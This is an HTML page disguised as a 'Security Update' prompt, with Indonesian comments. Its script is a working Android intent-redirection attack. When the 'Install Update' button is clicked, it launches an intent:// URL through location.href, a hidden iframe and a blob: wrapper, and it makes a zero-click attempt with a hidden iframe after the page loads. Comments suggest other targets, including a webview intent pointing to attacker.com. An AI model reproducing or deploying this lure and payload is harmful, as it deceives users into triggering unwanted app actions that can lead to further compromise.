<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 400px; width: 100%;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px 30px;
    border-radius: 8px; font-size: 18px; font-weight: bold;
    cursor: pointer; border: none; width: 100%;
  }
  button:hover { background: #005bb5; }
  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 400px;
    height: 100px; overflow-y: auto; text-align: left;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Update</h1>
  <p>Klik tombol di bawah untuk memperbarui sistem.</p>
  
  <!-- Tombol Pemicu Intent Redirection -->
  <button id="intentBtn">Install Update</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. INTENT REDIRECTION VECTOR (ANDROID)
  // ============================================
  // Format umum: intent://host#Intent;scheme=...;package=...;end
  // Celah: Beberapa browser Android mengizinkan Intent ke package internal
  // tanpa verifikasi.
  
  // Target: Android Settings (Bisa digunakan untuk eksploitasi lebih lanjut)
  // Atau: intent://webview?url=https://attacker.com#Intent;package=com.android.chrome;end
  
  var targetIntent = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
  // Atau gunakan: intent://settings#Intent;action=android.settings.SETTINGS;end

  // ============================================
  // 2. EKSEKUSI (Clickjacking / One Click)
  // ============================================
  document.getElementById('intentBtn').addEventListener('click', function() {
    log("[!] Memicu Intent Redirection...");
    
    // Trik 1: Location.href (Langsung)
    try {
      window.location.href = targetIntent;
      log("[+] Intent dieksekusi via location.href.");
    } catch(e) {
      log("[-] Gagal: " + e.message);
    }

    // Trik 2: Iframe tersembunyi (Zero-Click Iframe)
    setTimeout(function() {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = targetIntent;
      document.body.appendChild(iframe);
      log("[+] Intent via Iframe dicoba.");
    }, 500);

    // Trik 3: Blob Wrapper (Untuk iOS/Safari)
    // Safari kadang membuka intent dari blob: URL
    setTimeout(function() {
      try {
        var blobPayload = `<script>window.location.href = "${targetIntent}";<\/script>`;
        var blob = new Blob([blobPayload], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.location.replace(url);
        log("[+] Intent via Blob dicoba.");
      } catch(e) {}
    }, 1000);
  });

  // ============================================
  // 3. ZERO-CLICK ATTEMPT (Diblokir Browser Modern)
  // ============================================
  // Mencoba mengeksekusi Intent tanpa klik (Zero-Click)
  setTimeout(function() {
    log("[Zero-Click] Mencoba Intent tanpa klik...");
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = targetIntent;
    document.body.appendChild(iframe);
    // (Chrome Android akan memblokir ini secara senyap)
  }, 2000);

})();
</script>
</body>
</html>
